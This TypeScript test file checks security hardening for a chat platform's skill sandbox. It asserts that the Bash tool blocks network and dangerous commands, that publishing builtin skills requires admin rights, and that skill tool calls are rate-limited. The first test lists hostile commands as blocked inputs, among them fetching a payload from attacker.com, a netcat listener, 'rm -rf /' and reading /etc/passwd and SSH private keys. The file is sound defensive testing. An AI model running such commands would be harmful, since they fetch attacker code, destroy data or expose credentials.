import assert from "node:assert/strict";
import test from "node:test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { executeBash, initSandbox } from "./sandboxManager.js";
import { handleSkillToolCall } from "./skillToolHandler.js";
import { openChatDatabase } from "../../../platform/database/chatDatabase.js";
import { SkillRepository } from "../repositories/skillRepository.js";
import { seedBuiltinSkills } from "./seedBuiltinSkills.js";
import { createSkill, setSkillRepository } from "../http/skill.controller.js";
import type { Request, Response } from "express";

interface TestResponseBody {
  error: string;
}

function mockRes() {
  let statusCode = 200;
  let body = {} as TestResponseBody;
  const res: Partial<Response> = {
    status(code: number) {
      statusCode = code;
      return res as Response;
    },
    json(data: TestResponseBody) {
      body = data;
      return res as Response;
    },
  };
  return {
    res: res as Response,
    getStatus: () => statusCode,
    getBody: () => body,
  };
}

test("Security Hardening - Bash tool blocks unauthorized network utilities", async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "sec-test-"));
  process.env["SANDBOX_BASE_DIR"] = tmpDir;

  try {
    const paths = initSandbox("conv-sec-net", []);

    const networkCommands = [
      "curl https://malicious.com",
      "wget http://attacker.com/payload.sh",
      "nc -l 8080",
      "ssh user@remote.server",
      "ping 8.8.8.8",
      "sudo rm -rf /",
      "cat /etc/passwd",
      "cat ~/.ssh/id_rsa",
    ];

    for (const cmd of networkCommands) {
      const res = await executeBash(cmd, paths);
      assert.equal(res.isError, true, `Expected command '${cmd}' to be blocked`);
      assert.ok(
        res.content.includes("security policy"),
        `Expected security policy error for '${cmd}'`
      );
    }
  } finally {
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  }
});

test("Security Hardening - Admin authorization required to publish builtin or org skills", async () => {
  const db = openChatDatabase(":memory:");
  const repo = new SkillRepository(db);
  setSkillRepository(repo);

  const { res, getStatus, getBody } = mockRes();
  const req = {
    principal: { uid: "user-attacker" },
    body: {
      zipBase64: Buffer.from("dummy").toString("base64"),
      scope: "builtin", // Unauthorized attempt to publish as builtin
    },
    headers: { "x-is-admin": "false" },
  } as unknown as Request;

  await createSkill(req, res);
  assert.equal(getStatus(), 403);
  assert.ok(getBody().error.includes("administrator privileges"));
});

test("Security Hardening - Skill tool call rate limiter throttles excessive calls", () => {
  const db = openChatDatabase(":memory:");
  const repo = new SkillRepository(db);
  seedBuiltinSkills(repo);

  const now = Date.now();
  db.prepare(
    `INSERT INTO conversations (id, user_id, title, model, created_at, updated_at)
     VALUES (?, ?, ?, ?, ?, ?)`
  ).run("conv-rate-1", "user-flooder", "Flood Test", "claude-3-5-sonnet", now, now);

  const builtin = repo.getByNameAndScope("hello-format", "builtin");
  assert.ok(builtin);
  repo.setConversationSkills("conv-rate-1", [builtin.id], "user-flooder");

  let throttled = false;
  // Trigger 105 rapid tool calls
  for (let i = 0; i < 105; i++) {
    const res = handleSkillToolCall("hello-format", "conv-rate-1", "user-flooder", repo);
    if (res.isError && res.content.includes("Rate limit exceeded")) {
      throttled = true;
      break;
    }
  }

  assert.equal(throttled, true, "Expected Skill tool call to be rate limited");
});
